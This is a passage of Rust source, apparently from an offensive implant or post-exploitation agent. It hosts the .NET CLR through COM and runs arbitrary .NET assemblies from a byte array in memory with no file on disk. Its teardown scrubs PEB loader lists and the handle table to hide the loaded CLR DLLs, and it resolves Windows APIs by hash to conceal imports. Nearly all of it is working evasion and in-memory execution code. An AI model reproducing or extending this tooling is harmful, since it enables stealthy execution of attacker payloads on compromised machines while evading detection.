    let iid_enum = GUID {
        // IID_IEnumUnknown
        data1: 0x00000100,
        data2: 0x0000,
        data3: 0x0000,
        data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
    };
    let mut enum_ptr: LPVOID = std::ptr::null_mut();
    let hr = (meta_host.vtable.enumerate_installed_runtimes)(
        meta_host_ptr,
        iid_enum.as_ptr(),
        &mut enum_ptr,
    );
    if hr != S_OK || enum_ptr.is_null() {
        // Release meta_host
        (meta_host.vtable.release)(meta_host_ptr);
        return Err(format!(
            "EnumerateInstalledRuntimes failed: hr={:#010X}",
            hr as u32
        ));
    }
    let enumerator = &*(enum_ptr as *const IEnumUnknown);

    let mut best_runtime: Option<(*mut ICLRRuntimeInfo, Vec<u16>)> = None;
    let mut best_version: u32 = 0; // e.g. 40999 for "v4.0.99919"

    loop {
        let mut fetched: ULONG = 0;
        let mut item: LPVOID = std::ptr::null_mut();
        let hr = (enumerator.vtable.next)(enum_ptr, 1, &mut item, &mut fetched);
        if hr != S_OK || fetched == 0 {
            break;
        }

        let runtime_info = &*(item as *const ICLRRuntimeInfo);

        // Get version string.
        let mut buf_len: DWORD = 128;
        let mut version_buf = vec![0u16; buf_len as usize];
        let hr = (runtime_info.vtable.get_version_string)(
            item,
            version_buf.as_mut_ptr(),
            &mut buf_len,
            std::ptr::null_mut(),
        );
        if hr != S_OK {
            // Try again with returned length.
            version_buf = vec![0u16; buf_len as usize];
            let hr2 = (runtime_info.vtable.get_version_string)(
                item,
                version_buf.as_mut_ptr(),
                &mut buf_len,
                std::ptr::null_mut(),
            );
            if hr2 != S_OK {
                (runtime_info.vtable.release)(item);
                continue;
            }
        }

        let version_str = String::from_utf16_lossy(
            &version_buf[..buf_len as usize].iter().copied().filter(|&c| c != 0).collect::<Vec<u16>>(),
        );
        log::info!("[assembly_loader] found runtime: {}", version_str.trim());

        // Parse version: we want "v4.x.y..." — extract major and build a
        // sortable numeric value.  For simplicity, look for "v4." prefix.
        let numeric_version = if version_str.starts_with('v') || version_str.starts_with('V') {
            let digits: String = version_str
                .trim_start_matches(|c: char| !c.is_ascii_digit())
                .chars()
                .take_while(|c| c.is_ascii_digit() || *c == '.')
                .collect();
            parse_version_to_u32(&digits)
        } else {
            0
        };

        // Only consider v4.x runtimes.
        if numeric_version >= 4_000_000 && numeric_version > best_version {
            best_version = numeric_version;
            // Get a fresh reference (we'll use this one).
            // We don't AddRef — we'll release it below in the cleanup loop
            // and re-get it.  For simplicity, keep this reference.
            best_runtime = Some((item as *mut ICLRRuntimeInfo, version_buf.clone()));
        } else {
            // Release this runtime info.
            (runtime_info.vtable.release)(item);
        }
    }

    // Release enumerator.
    (enumerator.vtable.release)(enum_ptr);

    let (runtime_info_ptr, _ver_buf) = match best_runtime {
        Some(r) => r,
        None => {
            (meta_host.vtable.release)(meta_host_ptr);
            return Err("no .NET Framework v4.x runtime found".to_string());
        }
    };
    let runtime_info = &*runtime_info_ptr;
    log::info!(
        "[assembly_loader] selected runtime version (numeric={})",
        best_version
    );

    // ── Get ICLRRuntimeHost ─────────────────────────────────────────────
    let mut runtime_host_ptr: LPVOID = std::ptr::null_mut();
    let hr = (runtime_info.vtable.get_interface)(
        runtime_info_ptr as *mut c_void,
        CLSID_CLR_RUNTIME_HOST.as_clsid_ptr(),
        IID_ICLR_RUNTIME_HOST.as_ptr(),
        &mut runtime_host_ptr,
    );

    // Release the runtime info now that we have the host.
    (runtime_info.vtable.release)(runtime_info_ptr as *mut c_void);
    // Release meta_host.
    (meta_host.vtable.release)(meta_host_ptr);

    if hr != S_OK || runtime_host_ptr.is_null() {
        return Err(format!(
            "GetInterface(ICLRRuntimeHost) failed: hr={:#010X}",
            hr as u32
        ));
    }

    let runtime_host = &*(runtime_host_ptr as *const ICLRRuntimeHost);

    // ── Start the CLR ───────────────────────────────────────────────────
    let hr = (runtime_host.vtable.start)(runtime_host_ptr);
    if hr != S_OK {
        (runtime_host.vtable.release)(runtime_host_ptr);
        return Err(format!("ICLRRuntimeHost::Start() failed: hr={:#010X}", hr as u32));
    }

    log::info!("[assembly_loader] CLR started successfully");

    // ── Get ICorRuntimeHost (v2 hosting interface, available on v4 runtime) ──
    //
    // We need ICorRuntimeHost for GetDefaultDomain(), which returns an
    // IUnknown pointer to the default AppDomain.  From there we use
    // IDispatch late binding to call AppDomain.Load_3(byte[]) for in-memory
    // assembly loading — no file on disk required.
    //
    // If this fails (unlikely on .NET Framework 4.x), we return null and
    // fall back to the file-based ExecuteInDefaultAppDomain path.
    let mut cor_host_ptr: LPVOID = std::ptr::null_mut();

    // Re-create meta_host + enumerate to get a fresh runtime_info.  We
    // released the earlier one after getting ICLRRuntimeHost.
    let mut meta_host_ptr2: LPVOID = std::ptr::null_mut();
    let hr2 = create_instance(
        CLSID_CLR_META_HOST.as_clsid_ptr(),
        IID_ICLR_META_HOST.as_ptr(),
        &mut meta_host_ptr2,
    );
    if hr2 == S_OK && !meta_host_ptr2.is_null() {
        let meta_host2 = &*(meta_host_ptr2 as *const ICLRMetaHost);
        let iid_enum2 = GUID {
            data1: 0x00000100,
            data2: 0x0000,
            data3: 0x0000,
            data4: [0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46],
        };
        let mut enum_ptr2: LPVOID = std::ptr::null_mut();
        let hr3 = (meta_host2.vtable.enumerate_installed_runtimes)(
            meta_host_ptr2,
            iid_enum2.as_ptr(),
            &mut enum_ptr2,
        );
        if hr3 == S_OK && !enum_ptr2.is_null() {
            let enumerator2 = &*(enum_ptr2 as *const IEnumUnknown);
            // Re-enumerate to find the same best runtime.
            let mut best_rt2: Option<*mut c_void> = None;
            let mut best_ver2: u32 = 0;
            loop {
                let mut fetched: ULONG = 0;
                let mut item: LPVOID = std::ptr::null_mut();
                let hr = (enumerator2.vtable.next)(enum_ptr2, 1, &mut item, &mut fetched);
                if hr != S_OK || fetched == 0 {
                    break;
                }
                let ri = &*(item as *const ICLRRuntimeInfo);
                let mut blen: DWORD = 128;
                let mut vbuf = vec![0u16; blen as usize];
                let hr = (ri.vtable.get_version_string)(
                    item,
                    vbuf.as_mut_ptr(),
                    &mut blen,
                    std::ptr::null_mut(),
                );
                if hr != S_OK {
                    vbuf = vec![0u16; blen as usize];
                    let _ = (ri.vtable.get_version_string)(
                        item,
                        vbuf.as_mut_ptr(),
                        &mut blen,
                        std::ptr::null_mut(),
                    );
                }
                let vs = String::from_utf16_lossy(
                    &vbuf[..blen as usize].iter().copied().filter(|&c| c != 0).collect::<Vec<u16>>(),
                );
                let nv = if vs.starts_with('v') || vs.starts_with('V') {
                    let d: String = vs.trim_start_matches(|c: char| !c.is_ascii_digit())
                        .chars().take_while(|c| c.is_ascii_digit() || *c == '.').collect();
                    parse_version_to_u32(&d)
                } else { 0 };
                if nv >= 4_000_000 && nv > best_ver2 {
                    best_ver2 = nv;
                    if let Some(old) = best_rt2.take() {
                        let old_ri = &*(old as *const ICLRRuntimeInfo);
                        (old_ri.vtable.release)(old);
                    }
                    best_rt2 = Some(item);
                } else {
                    (ri.vtable.release)(item);
                }
            }
            (enumerator2.vtable.release)(enum_ptr2);
            if let Some(rt2) = best_rt2 {
                let ri2 = &*(rt2 as *const ICLRRuntimeInfo);
                let hr = (ri2.vtable.get_interface)(
                    rt2,
                    CLSID_COR_RUNTIME_HOST.as_clsid_ptr(),
                    IID_ICOR_RUNTIME_HOST.as_ptr(),
                    &mut cor_host_ptr,
                );
                if hr == S_OK && !cor_host_ptr.is_null() {
                    log::info!("[assembly_loader] ICorRuntimeHost obtained — in-memory loading available");
                } else {
                    log::warn!(
                        "[assembly_loader] GetInterface(ICorRuntimeHost) failed: hr={:#010X} — will use file-based fallback",
                        hr as u32
                    );
                    cor_host_ptr = std::ptr::null_mut();
                }
                (ri2.vtable.release)(rt2);
            }
        }
        let mh2 = &*(meta_host_ptr2 as *const ICLRMetaHost);
        (mh2.vtable.release)(meta_host_ptr2);
    }

    Ok((runtime_host_ptr as *mut ICLRRuntimeHost, cor_host_ptr as *mut ICorRuntimeHost))
}

/// Parse a version string like "4.0.30319.42000" into a u32 for comparison.
/// Returns e.g. 4_030_319 for "4.0.30319".  Only uses first 3 components.
fn parse_version_to_u32(s: &str) -> u32 {
    let parts: Vec<u32> = s
        .split('.')
        .filter_map(|p| p.parse().ok())
        .collect();
    match parts.len() {
        0 => 0,
        1 => parts[0] * 1_000_000,
        2 => parts[0] * 1_000_000 + parts[1] * 10_000,
        _ => parts[0] * 1_000_000 + parts[1] * 10_000 + parts[2],
    }
}

// ── CLR Teardown ─────────────────────────────────────────────────────────────

/// Stop and release the CLR host, then scrub PEB traces for CLR DLLs.
unsafe fn teardown_clr_host(state: &mut ClrHostState) {
    if !state.runtime_host.is_null() {
        let host = &*state.runtime_host;
        (host.vtable.stop)(state.runtime_host as *mut c_void);
        (host.vtable.release)(state.runtime_host as *mut c_void);
        state.runtime_host = std::ptr::null_mut();
        log::info!("[assembly_loader] CLR host stopped and released");
    }
    if !state.cor_host.is_null() {
        let cor = &*state.cor_host;
        (cor.vtable.release)(state.cor_host as *mut c_void);
        state.cor_host = std::ptr::null_mut();
        log::info!("[assembly_loader] ICorRuntimeHost released");
    }
    if !state.mscoree.is_null() {
        // FreeLibrary would unload, but we don't want to call it explicitly —
        // the PEB scrub will unlink it.
        state.mscoree = std::ptr::null_mut();
    }

    // Scrub PEB traces — this will unlink CLR DLLs (clrjit.dll, clr.dll,
    // mscorlib.ni.dll, etc.) from the PEB LDR lists.
    crate::memory_hygiene::scrub_peb_traces();
    crate::memory_hygiene::scrub_handle_table();
    log::info!("[assembly_loader] PEB and handle hygiene applied after CLR teardown");
}

// ── Idle watcher ─────────────────────────────────────────────────────────────

/// Check if the CLR host has been idle too long and tear it down if so.
fn check_idle_timeout() {
    let mut guard = match CLR_HOST.lock() {
        Ok(g) => g,
        Err(_) => return,
    };
    if let Some(ref mut state) = *guard {
        if state.initialized && state.last_used.elapsed().as_secs() > IDLE_TIMEOUT_SECS {
            log::info!(
                "[assembly_loader] CLR host idle for >{}s, tearing down",
                IDLE_TIMEOUT_SECS
            );
            unsafe {
                teardown_clr_host(state);
            }
            state.initialized = false;
        }
    }
}

/// Background thread that periodically checks for idle CLR host and tears it
/// down after IDLE_TIMEOUT_SECS.
fn idle_watcher() {
    loop {
        std::thread::sleep(Duration::from_secs(30));
        check_idle_timeout();
    }
}

/// Ensure the idle watcher thread is started.
static IDLE_WATCHER_STARTED: OnceLock<()> = OnceLock::new();

fn ensure_idle_watcher() {
    let _ = IDLE_WATCHER_STARTED.get_or_init(|| {
        std::thread::Builder::new()
            .name("clr-idle-watcher".to_string())
            .spawn(idle_watcher)
            .expect("failed to spawn CLR idle watcher thread");
        log::info!("[assembly_loader] idle watcher thread started");
    });
}

// ── .NET CLI Metadata Parsing ─────────────────────────────────────────────────
//
// Minimal parser for extracting the entry-point type name from a .NET assembly's
// CLI metadata.  This is needed because ExecuteInDefaultAppDomain requires the
// exact type name (e.g., "Namespace.Program"), which cannot be derived from the
// file name or any heuristic — it must be read from the TypeDef table.
//
// The parser follows ECMA-335:
//   PE → OptionalHeader.DataDirectory[14] → CLI Header → Metadata Root → #~ stream → TypeDef table → #Strings heap

/// Common entry point type names tried as fallback when metadata parsing fails.
const COMMON_ENTRY_TYPE_NAMES: &[&str] = &["Program", "App", "Startup", "EntryPoint"];

/// Read a u16 from a byte slice at the given offset (bounds-checked).
#[inline]
fn read_u16_at(data: &[u8], off: usize) -> Option<u16> {
    data.get(off..off + 2).map(|b| u16::from_le_bytes([b[0], b[1]]))
}

/// Read a u32 from a byte slice at the given offset (bounds-checked).
#[inline]
fn read_u32_at(data: &[u8], off: usize) -> Option<u32> {
    data.get(off..off + 4).map(|b| u32::from_le_bytes([b[0], b[1], b[2], b[3]]))
}

/// Read a null-terminated string from the #Strings heap at the given byte index.
fn read_heap_string(data: &[u8], heap_off: usize, heap_len: usize, idx: usize) -> Option<String> {
    if idx >= heap_len {
        return None;
    }
    let start = heap_off + idx;
    let mut end = start;
    while end < data.len() && data[end] != 0 {
        end += 1;
    }
    Some(String::from_utf8_lossy(&data[start..end]).into_owned())
}

/// Convert a Relative Virtual Address to a file offset using the PE section table.
fn rva_to_file_offset(data: &[u8], rva: u32) -> Option<usize> {
    if data.len() < 64 {
        return None;
    }
    let e_lfanew = read_u32_at(data, 0x3C)? as usize;
    if e_lfanew + 24 > data.len() {
        return None;
    }
    let coff = e_lfanew + 4;
    let num_sections = read_u16_at(data, coff + 2)? as usize;
    let size_opt_hdr = read_u16_at(data, coff + 16)? as usize;
    let sec_table = coff + 20 + size_opt_hdr;

    for i in 0..num_sections {
        let s = sec_table + i * 40;
        if s + 40 > data.len() {
            return None;
        }
        let vs = read_u32_at(data, s + 8)?;
        let va = read_u32_at(data, s + 12)?;
        let rs = read_u32_at(data, s + 16)?;
        let ro = read_u32_at(data, s + 20)?;

        // Use the larger of VirtualSize and SizeOfRawData for the range check
        let section_end = va + std::cmp::max(vs, rs);
        if rva >= va && rva < section_end {
            return Some((rva - va + ro) as usize);
        }
    }
    None
}

/// Read a string index (2 or 4 bytes depending on heap size bit) from the #~ stream.
fn read_string_idx(data: &[u8], off: usize, wide: bool) -> Option<usize> {
    if wide {
        read_u32_at(data, off).map(|v| v as usize)
    } else {
        read_u16_at(data, off).map(|v| v as usize)
    }
}

/// Extract the entry-point type name from a .NET assembly's CLI metadata.
///
/// Strategy:
/// 1. Parse the entry-point token from the CLI header → resolve to a TypeDef
///    via the MethodList ranges.
/// 2. If the token is absent or unresolvable, scan the TypeDef table for
///    types matching common entry-point names.
/// 3. Ultimate fallback: return "Program".
fn extract_entry_point_type_name(data: &[u8]) -> String {
    match extract_entry_point_type_name_inner(data) {
        Some(name) => name,
        None => {
            log::warn!(
                "[assembly_loader] failed to parse .NET metadata for entry point, \
                 using fallback type name 'Program'"
            );
            "Program".to_string()
        }
    }
}

fn extract_entry_point_type_name_inner(data: &[u8]) -> Option<String> {
    // ── PE Header ──────────────────────────────────────────────────────
    if data.len() < 64 || data[0] != b'M' || data[1] != b'Z' {
        return None;
    }
    let e_lfanew = read_u32_at(data, 0x3C)? as usize;
    if e_lfanew + 26 > data.len() || &data[e_lfanew..e_lfanew + 4] != b"PE\0\0" {
        return None;
    }
    let coff = e_lfanew + 4;
    let opt = coff + 20;
    if opt + 2 > data.len() {
        return None;
    }
    let magic = read_u16_at(data, opt)?;
    // DataDirectory offset in the optional header
    let dd_off = match magic {
        0x10B => opt + 96,  // PE32: 16 entries starting at offset 96
        0x20B => opt + 112, // PE32+: 16 entries starting at offset 112
        _ => return None,
    };

    // IMAGE_DIRECTORY_ENTRY_COM_DESCRIPTOR = 14
    let com_dd = dd_off + 14 * 8;
    let cli_rva = read_u32_at(data, com_dd)?;
    if cli_rva == 0 {
        return None;
    }
    let cli_off = rva_to_file_offset(data, cli_rva)?;

    // ── CLI Header (IMAGE_COR20_HEADER) ────────────────────────────────
    // +0x08: MetaData RVA (4)     +0x0C: MetaData Size (4)
    // +0x14: EntryPointToken (4)
    let md_rva = read_u32_at(data, cli_off + 8)?;
    let ep_token = read_u32_at(data, cli_off + 0x14)?;
    if md_rva == 0 {
        return None;
    }
    let md_off = rva_to_file_offset(data, md_rva)?;

    // ── Metadata Root (BSJB) ───────────────────────────────────────────
    let sig = read_u32_at(data, md_off)?;
    if sig != 0x424A5342 {
        return None; // "BSJB" in LE
    }
    let ver_len = read_u32_at(data, md_off + 12)? as usize;
    let ver_end_aligned = (md_off + 16 + ver_len + 3) & !3;
    let num_streams = read_u16_at(data, ver_end_aligned + 2)? as usize;

    // ── Parse stream headers ───────────────────────────────────────────
    let mut soff = ver_end_aligned + 4;
    let mut tilde_off: usize = 0;
    let mut strings_off: usize = 0;
    let mut strings_len: usize = 0;

    for _ in 0..num_streams {
        let s_offset = read_u32_at(data, soff)? as usize;
        let s_size = read_u32_at(data, soff + 4)? as usize;
        let name_start = soff + 8;
        let mut name_end = name_start;
        while name_end < data.len() && data[name_end] != 0 {
            name_end += 1;
        }
        let name = std::str::from_utf8(data.get(name_start..name_end)?).unwrap_or("");

        match name {
            "#~" | "#" => tilde_off = md_off + s_offset,
            "#Strings" => {
                strings_off = md_off + s_offset;
                strings_len = s_size;
            }
            _ => {}
        }

        // Advance past name + null + align to 4 bytes
        soff = (name_end + 1 + 3) & !3;
    }

    if tilde_off == 0 || strings_off == 0 {
        return None;
    }

    // ── Parse #~ stream header ─────────────────────────────────────────
    // +6: HeapSizes byte
    let heap_sizes = *data.get(tilde_off + 6)?;
    let str_wide = heap_sizes & 1 != 0; // #Strings uses 4-byte indices
    let guid_wide = heap_sizes & 2 != 0;
    let blob_wide = heap_sizes & 4 != 0;
    let str_sz = if str_wide { 4usize } else { 2 };
    let guid_sz = if guid_wide { 4usize } else { 2 };
    let blob_sz = if blob_wide { 4usize } else { 2 };

    let valid = u64::from_le_bytes(data.get(tilde_off + 8..tilde_off + 16)?.try_into().ok()?);

    // Read row counts
    let mut rows: [u32; 64] = [0; 64];
    let mut roff = tilde_off + 24;
    for i in 0..64 {
        if valid & (1u64 << i) != 0 {
            rows[i] = read_u32_at(data, roff)?;
            roff += 4;
        }
    }

    // ── Compute coded/index sizes ──────────────────────────────────────
    // ResolutionScope: Module(0), ModuleRef(0x1A), AssemblyRef(0x23), File(0x26) — 2-bit tag
    let max_rs = rows[0x00].max(rows[0x1A]).max(rows[0x23]).max(rows[0x26]);
    let rs_sz = if max_rs < (1 << 14) { 2usize } else { 4 };
    // TypeDefOrRef: TypeDef(0x02), TypeRef(0x01), TypeSpec(0x1B) — 2-bit tag
    let max_tdor = rows[0x02].max(rows[0x01]).max(rows[0x1B]);
    let tdor_sz = if max_tdor < (1 << 14) { 2usize } else { 4 };
    // Simple table indexes
    let field_idx_sz = if rows[0x04] < (1 << 16) { 2usize } else { 4 };
    let meth_idx_sz = if rows[0x06] < (1 << 16) { 2usize } else { 4 };
    let param_idx_sz = if rows[0x08] < (1 << 16) { 2usize } else { 4 };

    // ── Row sizes for tables 0x00–0x06 ─────────────────────────────────
    // Module(0x00): Generation(2) + Name(str) + Mvid(guid) + EncId(guid) + EncBaseId(guid)
    let mod_row = 2 + str_sz + guid_sz * 3;
    // TypeRef(0x01): ResolutionScope(rs) + TypeName(str) + TypeNamespace(str)
    let tref_row = rs_sz + str_sz * 2;
    // TypeDef(0x02): Flags(4) + TypeName(str) + TypeNamespace(str) + Extends(tdor) + FieldList(field_idx) + MethodList(meth_idx)
    let tdef_row = 4 + str_sz * 2 + tdor_sz + field_idx_sz + meth_idx_sz;
    // FieldPtr(0x03): Field(field_idx)
    let fptr_row = field_idx_sz;
    // Field(0x04): Flags(2) + Name(str) + Signature(blob)
    let fld_row = 2 + str_sz + blob_sz;
    // MethodPtr(0x05): Method(meth_idx)
    let mptr_row = meth_idx_sz;
    // MethodDef(0x06): RVA(4) + ImplFlags(2) + Flags(2) + Name(str) + Signature(blob) + ParamList(param_idx)
    let mdef_row = 4 + 2 + 2 + str_sz + blob_sz + param_idx_sz;

    // ── Compute table offsets ──────────────────────────────────────────
    let table_row_sizes: [usize; 7] = [mod_row, tref_row, tdef_row, fptr_row, fld_row, mptr_row, mdef_row];
    let mut tdef_off: usize = 0;
    let mut mdef_off: usize = 0;

    for i in 0..7usize {
        if valid & (1u64 << i) != 0 {
            match i {
                0x02 => tdef_off = roff,
                0x06 => mdef_off = roff,
                _ => {}
            }
            roff += table_row_sizes[i] * rows[i] as usize;
        }
    }

    if tdef_off == 0 || rows[0x02] == 0 {
        return None;
    }
    let num_tdefs = rows[0x02] as usize;

    // ── Helper: extract fully-qualified type name from a TypeDef row ───
    let get_typedef_name = |row_idx: usize| -> Option<String> {
        let row_off = tdef_off + row_idx * tdef_row;
        if row_off + tdef_row > data.len() {
            return None;
        }
        let name_idx = read_string_idx(data, row_off + 4, str_wide)?;
        let ns_idx = read_string_idx(data, row_off + 4 + str_sz, str_wide)?;
        let name = read_heap_string(data, strings_off, strings_len, name_idx)?;
        let ns = read_heap_string(data, strings_off, strings_len, ns_idx).unwrap_or_default();
        if ns.is_empty() {
            Some(name)
        } else {
            Some(format!("{}.{}", ns, name))
        }
    };

    // ── Strategy 1: follow entry point token ───────────────────────────
    let ep_table = (ep_token >> 24) as usize;
    let ep_row = (ep_token & 0x00FF_FFFF) as usize;

    if ep_table == 0x06 && ep_row > 0 && mdef_off > 0 {
        // Entry point is a MethodDef — find the TypeDef that owns it.
        // TypeDef.MethodList is 1-based; method ep_row belongs to the type
        // where MethodList[i] <= ep_row < MethodList[i+1].
        let ml_off_in_row = 4 + str_sz * 2 + tdor_sz + field_idx_sz;

        for i in 0..num_tdefs {
            let row_off = tdef_off + i * tdef_row;
            let m_start = read_string_idx(data, row_off + ml_off_in_row, meth_idx_sz == 4)?;

            let m_end = if i + 1 < num_tdefs {
                let next_off = tdef_off + (i + 1) * tdef_row;
                read_string_idx(data, next_off + ml_off_in_row, meth_idx_sz == 4)?
            } else {
                rows[0x06] as usize + 1
            };

            if ep_row >= m_start && ep_row < m_end {
                return get_typedef_name(i);
            }
        }
    }

    // ── Strategy 2: scan TypeDef for common entry-point names ──────────
    for i in 0..num_tdefs {
        if let Some(name) = get_typedef_name(i) {
            // Skip the pseudo-type <Module>
            if name == "<Module>" {
                continue;
            }
            // Check short name (after last '.') against common names
            let short = name.rsplit('.').next().unwrap_or(&name);
            if COMMON_ENTRY_TYPE_NAMES.contains(&short) {
                return Some(name);
            }
        }
    }

    // ── Strategy 3: return first non-<Module> type ─────────────────────
    for i in 0..num_tdefs {
        if let Some(name) = get_typedef_name(i) {
            if name != "<Module>" {
                log::warn!(
                    "[assembly_loader] no common entry point type found, \
                     using first type: '{}'",
                    name
                );
                return Some(name);
            }
        }
    }

    None
}

// ── Public API ───────────────────────────────────────────────────────────────

/// Result of an assembly execution.
pub struct AssemblyResult {
    /// Captured stdout+stderr output (UTF-8, lossy-decoded).
    pub output: String,
    /// HRESULT from the managed method invocation.
    pub hresult: HRESULT,
}

// ── In-Memory Assembly Loading via IDispatch ─────────────────────────────────
//
// This function implements the in-memory path:
//
//   ICorRuntimeHost::GetDefaultDomain()
//     → IUnknown → QI for IDispatch
//       → AppDomain.Load_3(SAFEARRAY<byte>)  →  Assembly (IDispatch)
//         → Assembly.EntryPoint               →  MethodInfo (IDispatch)
//           → MethodInfo.Invoke_2(null, args) →  executes the entry point
//
// All COM calls use IDispatch late binding so we don't need the exact vtable
// layout of managed COM callable wrappers (which have ~60 methods).

/// Execute a .NET assembly in-memory using CLR COM hosting + IDispatch.
///
/// Returns `Ok(AssemblyResult)` on success, or `Err(msg)` if the in-memory
/// path is unavailable or fails (caller should fall back to file-based).
unsafe fn execute_in_memory_internal(
    cor_host: *mut ICorRuntimeHost,
    assembly_bytes: &[u8],
    args: &[String],
    timeout_secs: u64,
) -> Result<AssemblyResult, String> {
    let host = &*cor_host;

    // ── 1. Get default AppDomain ────────────────────────────────────────
    let mut appdomain_ptr: *mut c_void = std::ptr::null_mut();
    let hr = (host.vtable.get_default_domain)(
        cor_host as *mut c_void,
        &mut appdomain_ptr,
    );
    if hr != S_OK || appdomain_ptr.is_null() {
        return Err(format!(
            "ICorRuntimeHost::GetDefaultDomain failed: hr={:#010X}",
            hr as u32
        ));
    }
    log::info!("[assembly_loader] in-memory: default AppDomain obtained");

    // ── 2. QI AppDomain for IDispatch ───────────────────────────────────
    let appdomain_dispatch = &*(appdomain_ptr as *const IDispatch);
    let mut dispatch_ptr: LPVOID = std::ptr::null_mut();
    let hr = (appdomain_dispatch.vtable.query_interface)(
        appdomain_ptr,
        IID_IDISPATCH.as_ptr(),
        &mut dispatch_ptr,
    );
    if hr != S_OK || dispatch_ptr.is_null() {
        // Release the appdomain IUnknown.
        let unk = &*(appdomain_ptr as *const ICLRRuntimeHost); // reuse QI/AddRef/Release layout
        (unk.vtable.release)(appdomain_ptr);
        return Err(format!(
            "AppDomain QI for IDispatch failed: hr={:#010X}",
            hr as u32
        ));
    }
    let appdomain = dispatch_ptr as *mut IDispatch;

    // ── 3. Build SAFEARRAY<byte> from assembly bytes ────────────────────
    let sa_bytes = safe_array_from_bytes(assembly_bytes)?;

    // ── 4. Call AppDomain.Load_3(byte[]) → Assembly ─────────────────────
    let load_name = to_wide("Load_3");
    let dispid_load = dispatch_get_id(appdomain, &load_name)?;

    let mut load_arg = VARIANT::from_safe_array(sa_bytes);
    let mut load_params = DISPPARAMS {
        rgvarg: &mut load_arg,
        rgdispid_named_args: std::ptr::null_mut(),
        c_args: 1,
        c_named_args: 0,
    };

    let assembly_result = dispatch_invoke(appdomain, dispid_load, DISPATCH_METHOD, &mut load_params)?;
    variant_clear(&mut load_arg);
    safe_array_destroy(sa_bytes);

    if assembly_result.vt != VT_DISPATCH && assembly_result.vt != VT_UNKNOWN {
        let vt = assembly_result.vt;
        variant_clear(&mut assembly_result);
        // Release appdomain IDispatch.
        let disp = &*appdomain;
        (disp.vtable.release)(appdomain as *mut c_void);
        // Release appdomain IUnknown.
        let unk = &*(appdomain_ptr as *const ICLRRuntimeHost);
        (unk.vtable.release)(appdomain_ptr);
        return Err(format!(
            "AppDomain.Load_3 returned unexpected VT: {:#06X} (expected VT_DISPATCH)",
            vt
        ));
    }

    let assembly_obj = assembly_result.data.pdisp_val;
    let assembly_disp = assembly_obj as *mut IDispatch;
    log::info!("[assembly_loader] in-memory: Assembly loaded from byte array");

    // ── 5. Get Assembly.EntryPoint → MethodInfo ─────────────────────────
    let ep_name = to_wide("EntryPoint");
    let dispid_ep = dispatch_get_id(assembly_disp, &ep_name)?;

    let mut ep_params = DISPPARAMS {
        rgvarg: std::ptr::null_mut(),
        rgdispid_named_args: std::ptr::null_mut(),
        c_args: 0,
        c_named_args: 0,
    };

    let ep_result = dispatch_invoke(assembly_disp, dispid_ep, DISPATCH_PROPERTYGET, &mut ep_params)?;

    if ep_result.vt != VT_DISPATCH && ep_result.vt != VT_UNKNOWN {
        let vt = ep_result.vt;
        variant_clear(&mut ep_result);
        variant_clear(&mut assembly_result);
        let disp = &*appdomain;
        (disp.vtable.release)(appdomain as *mut c_void);
        let unk = &*(appdomain_ptr as *const ICLRRuntimeHost);
        (unk.vtable.release)(appdomain_ptr);
        return Err(format!(
            "Assembly.EntryPoint returned unexpected VT: {:#06X}",
            vt
        ));
    }

    let method_info = ep_result.data.pdisp_val;
    let method_disp = method_info as *mut IDispatch;
    log::info!("[assembly_loader] in-memory: EntryPoint MethodInfo obtained");

    // ── 6. Build args array for Invoke ──────────────────────────────────
    // MethodInfo.Invoke_2(object obj, object[] parameters)
    // For a static Main method, obj = null.
    // The args parameter is a string[] on the managed side, which we pass
    // as object[] of strings.

    let arg_bstrs: Vec<*mut u16> = args.iter().map(|a| {
        let wide = to_wide(a);
        unsafe { sys_alloc_string(&wide) }
    }).collect();

    let mut arg_variants: Vec<VARIANT> = arg_bstrs.iter().map(|bstr| {
        VARIANT {
            vt: VT_BSTR,
            w_reserved1: 0,
            w_reserved2: 0,
            w_reserved3: 0,
            data: VARIANTData { bstr_val: *bstr },
        }
    }).collect();

    let sa_args = if arg_variants.is_empty() {
        std::ptr::null_mut()
    } else {
        safe_array_from_variants(&arg_variants)?
    };

    // ── 7. Set up pipe capture for stdout/stderr ────────────────────────
    let create_pipe: FnCreatePipe = resolve_api(
        pe_resolve::HASH_KERNEL32_DLL,
        pe_resolve::hash_str(b"CreatePipe\0"),
    ).ok_or("cannot resolve CreatePipe")?;

    let mut sa = SECURITY_ATTRIBUTES {
        nLength: std::mem::size_of::<SECURITY_ATTRIBUTES>() as u32,
        lpSecurityDescriptor: std::ptr::null_mut(),
        bInheritHandle: 1,
    };

    let mut stdout_read: HANDLE = std::ptr::null_mut();
    let mut stdout_write: HANDLE = std::ptr::null_mut();
    let mut stderr_read: HANDLE = std::ptr::null_mut();
    let mut stderr_write: HANDLE = std::ptr::null_mut();

    if create_pipe(&mut stdout_read, &mut stdout_write, &mut sa, 0) == 0 {
        return Err("CreatePipe(stdout) failed".to_string());
    }
    if create_pipe(&mut stderr_read, &mut stderr_write, &mut sa, 0) == 0 {
        let close: FnCloseHandle = resolve_api(
            pe_resolve::HASH_KERNEL32_DLL,
            pe_resolve::hash_str(b"CloseHandle\0"),
        ).unwrap_or(std::mem::transmute(std::ptr::null::<()>()));
        if !close as bool { close(stdout_read); }
        if !close as bool { close(stdout_write); }
        return Err("CreatePipe(stderr) failed".to_string());
    }

    // ── 8. Spawn execution on a separate thread with timeout ────────────
    //
    // We call Invoke_2 on a separate thread so we can enforce the timeout.
    // The CLR thread will write to our redirected stdout/stderr pipes.

    let invoke_name = to_wide("Invoke_2");
    let dispid_invoke = dispatch_get_id(method_disp, &invoke_name)?;

    // Prepare invoke args: Invoke_2(object obj, object[] parameters)
    // obj = null (VT_NULL), parameters = SAFEARRAY(object) or VT_NULL if no args
    let null_variant = VARIANT::null();
    let args_variant = if sa_args.is_null() {
        VARIANT::null()
    } else {
        VARIANT::from_safe_array_variant(sa_args)
    };

    let mut invoke_args = [null_variant, args_variant];

    // We need to run this on a separate thread for timeout enforcement.
    // Clone the raw pointers into a Send-able wrapper for the thread.
    struct InvokeCtx {
        method_disp: *mut IDispatch,
        dispid_invoke: i32,
        stdout_write: HANDLE,
        stderr_write: HANDLE,
        invoke_args: [VARIANT; 2],
    }
    unsafe impl Send for InvokeCtx {}

    let ctx = InvokeCtx {
        method_disp,
        dispid_invoke,
        stdout_write,
        stderr_write,
        invoke_args: invoke_args.clone(),
    };

    // Save original stdout/stderr so we can restore after.
    let get_std_handle: unsafe extern "system" fn(u32) -> HANDLE = std::mem::transmute(
